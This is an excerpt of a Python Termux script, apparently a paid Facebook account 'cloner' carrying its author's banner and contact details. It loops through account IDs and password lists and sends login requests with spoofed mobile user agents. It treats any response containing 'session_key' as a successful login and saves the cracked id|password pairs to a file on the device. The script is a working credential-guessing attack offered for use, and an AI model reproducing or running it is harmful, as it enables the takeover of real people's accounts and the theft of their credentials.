...
for xd in range(10000):
        aa='Mozilla/5.0 (Linux; Android 10; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.57 Mobile Safari/537.36'
...
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣷⣶⣶⣶⣶⣶⣶⣿⣷⣶⣿⣿⣾⣿⣶⣶⣿⣿⣷⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣷⣷⣿⣷⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶
                 ITZ JISAN TERMUX WORLD 
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣷⣶⣿⣿



 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 ┃ [✓] AUTHOR    \033[1;91m: \033[1;92mHAMIM UDFIN JISAN   
 ┃ [✓] TOOL      \033[1;91m: \033[1;92mALL CLONAR             
 ┃ [✓] STATUS    \033[1;91m: \033[1;92mPAID                      
 ┃ [✓] SYSTEM    \033[1;91m: \033[1;92m𝐃𝐀𝐓𝐀 & 𝐖𝐈𝐅𝐈                
 ┃ [✓] GITHUB    \033[1;91m: \033[1;92mX1X4D-2.0        
 ┃ [✓] FACEBOOK  \033[1;91m: \033[1;92mItz Jisan Xhowdhury               
 ┃ [✓] WHATSAPP  \033[1;91m: \033[1;92m++8801814649133            
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
 JISAN PRO VERSION 2.0
 FEEL THE POWER OF JISAN (⁠⌐⁠■⁠-⁠■⁠)
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://www.facebook.com/TurRealabbu1/');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://www.facebook.com/TurRealabbu1');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
...
if key2 in b:
    ...
    print(f" \033[1;37mYour Key : "+key2)
    ...
    linex()
    url_wa = "https://api.whatsapp.com/send?phone=+8801814649133&text="
    name = input(" Enter your Name : ")
    linex()
    tks = ("Hi HAMIM Sir, I Need To Buy Your Paid HAMIM PRO Tools Version 2.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+key2)
    subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
    print(' Run :  python HAMIM.py')
    exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [JISAN-OK] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                ua_string = f'Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.57 Mobile Safari/537.36;]'
                                ...
                                head = {
                                        ...
                                        'user-agent':'Mozilla/5.0 (Linux; Android 10; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.57 Mobile Safari/537.36',
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [JISAN-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/JISAN-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
...
def api1(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                ua_string = f'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/JISAN-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [JISAN-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/JISAN-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [JISAN-OK] '+uid+' | '+pas+'\033[1;97m')
